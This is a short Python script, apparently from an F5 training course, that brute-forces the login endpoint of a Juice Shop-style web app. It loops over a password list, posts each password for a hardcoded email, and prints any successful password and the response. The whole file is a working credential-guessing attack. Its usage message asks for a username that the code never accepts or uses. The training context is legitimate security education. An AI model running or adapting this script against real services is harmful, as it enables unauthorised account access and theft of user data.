#! /usr/bin/env python3
# Created on Oct 28, 2020
# F5 Global Services Training

import sys
import requests

if len(sys.argv) != 2:
  print("usage: " + sys.argv[0] + " <FQDN> <username>")
  sys.exit()

url = 'https://' + sys.argv[1] + '/rest/user/login'
cookies = dict(language='en', cookieconsent_status='dismiss', io='')
pwdfile = 'juice_passwords.txt'

with open(pwdfile) as fp:
        for index, pwd in enumerate(fp):
                payload = {"email": "studen1@f5.com", "password": pwd.replace('\n', '')}
                r = requests.post(url, data=payload, cookies=cookies)
                print("{}: {}".format(str(payload), r.status_code))
                if r.status_code == 200:
                        print("Successful login: " + pwd)
                        print(r.content)
                        fp.close()
                        exit()

print("No successful login found!")


